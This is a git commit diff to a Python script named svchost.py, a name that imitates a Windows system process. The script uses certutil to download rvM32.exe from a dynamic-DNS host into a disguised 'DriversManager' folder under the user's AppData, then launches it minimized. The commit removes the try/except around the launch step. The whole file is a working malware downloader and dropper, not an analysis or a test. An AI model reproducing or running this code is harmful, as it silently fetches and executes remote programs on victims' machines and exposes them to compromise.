390c80fabf93e181f3b02e8ca842acc9ecf00214
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-13 01:23:33 +0100

    Update svchost.py

--- svchost.py
+++ svchost.py
@@ -12,10 +12,8 @@ current_user = os.environ["USERNAME"]
 def dwnExec():
     dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive, current_user)
     os.system(dwn)
-    try:
-        exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive, current_user)
-        os.system(exc)
-    except:
-        pass
+    exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive, current_user)
+    os.system(exc)
+
 # CALL FUNCTION
 dwnExec()
